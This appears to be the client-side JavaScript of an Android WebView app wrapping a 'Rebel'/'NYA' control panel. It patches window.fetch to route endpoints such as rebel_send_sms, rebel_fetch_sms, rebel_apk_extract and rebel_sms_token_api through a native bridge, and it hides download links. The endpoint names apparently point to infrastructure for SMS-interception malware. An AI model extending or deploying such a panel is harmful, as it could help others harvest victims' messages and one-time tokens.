window.REBEL_NATIVE_APP = true;
window.NYA_APK = true;
window.SERVER_FIREBASES = window.SERVER_FIREBASES || [];

function nyaGetPanelServer() {
  if (window.PANEL_SERVER_URL) return String(window.PANEL_SERVER_URL).replace(/\/$/, '');
  if (window.RebelAndroid && typeof RebelAndroid.getPanelServerUrl === 'function') {
    try {
      var u = RebelAndroid.getPanelServerUrl();
      if (u) window.PANEL_SERVER_URL = String(u).replace(/\/$/, '');
    } catch (e) {}
  }
  return window.PANEL_SERVER_URL || '';
}

function nyaAbsUrl(path) {
  var p = String(path || '');
  if (/^https?:\/\//i.test(p)) return p;
  var base = nyaGetPanelServer();
  if (!base) return p;
  if (p.charAt(0) === '/') p = p.slice(1);
  return base + '/' + p;
}

function rebelApiPost(endpoint, body) {
  if (window.RebelAndroid && typeof RebelAndroid.apiPost === 'function') {
    try {
      return JSON.parse(RebelAndroid.apiPost(endpoint, JSON.stringify(body || {})));
    } catch (e) {
      return { ok: false, error: String(e) };
    }
  }
  return null;
}

function nyaNativeFetch(path, opts) {
  opts = opts || {};
  var method = (opts.method || 'GET').toUpperCase();
  var body = opts.body;
  if (method === 'POST' && body && !(typeof body === 'string')) {
    try { body = JSON.stringify(body); } catch (e) { body = '{}'; }
  }
  if (window.RebelAndroid && typeof RebelAndroid.panelFetch === 'function') {
    try {
      var payload = { url: nyaAbsUrl(path), method: method, body: body || '' };
      return Promise.resolve(JSON.parse(RebelAndroid.panelFetch(JSON.stringify(payload))));
    } catch (e) {
      return Promise.resolve({ ok: false, error: String(e) });
    }
  }
  var url = nyaAbsUrl(path);
  if (!/^https?:\/\//i.test(url)) {
    return Promise.resolve({ ok: false, error: 'Panel server URL not set' });
  }
  return fetch(url, {
    method: method,
    headers: opts.headers || (method === 'POST' ? { 'Content-Type': 'application/json' } : undefined),
    body: method === 'POST' ? body : undefined,
    cache: 'no-store'
  }).then(function (r) {
    return r.json().catch(function () { return { ok: false, error: 'Bad JSON' }; });
  }).catch(function (e) {
    return { ok: false, error: String(e && e.message ? e.message : e) };
  });
}

(function () {
  if (!window.REBEL_NATIVE_APP || window.fetch._nyaPatched) return;
  var orig = window.fetch.bind(window);
  window.fetch = function (input, init) {
    var url = typeof input === 'string' ? input : (input && input.url) || '';
    if (/nya\.php\?rebel_(send_sms|fetch_sms|firebase_api|apk_extract|sms_token_api)/i.test(url)) {
      var m = url.match(/rebel_(\w+)/);
      var ep = m ? 'rebel_' + m[1] : '';
      var method = ((init && init.method) || 'GET').toUpperCase();
      var body = init && init.body;
      if (method === 'POST' && body) {
        try { body = typeof body === 'string' ? JSON.parse(body) : body; } catch (e) { body = {}; }
        var native = rebelApiPost(ep, body);
        if (native) return Promise.resolve({ ok: !!native.ok, json: function () { return Promise.resolve(native); } });
        return nyaNativeFetch(url, { method: 'POST', body: body }).then(function (data) {
          return { ok: !!data.ok, json: function () { return Promise.resolve(data); } };
        });
      }
      if (/rebel_firebase_api/i.test(url) && method === 'GET') {
        return nyaNativeFetch(url).then(function (data) {
          return { ok: !!data.ok, json: function () { return Promise.resolve(data); } };
        });
      }
    }
    return orig(input, init);
  };
  window.fetch._nyaPatched = true;
})();

document.addEventListener('DOMContentLoaded', function () {
  document.body.classList.add('nya-apk-shell');
  document.querySelectorAll('.apk-dl-card, .apk-dl-btn, a[download]').forEach(function (el) {
    el.style.display = 'none';
  });
});
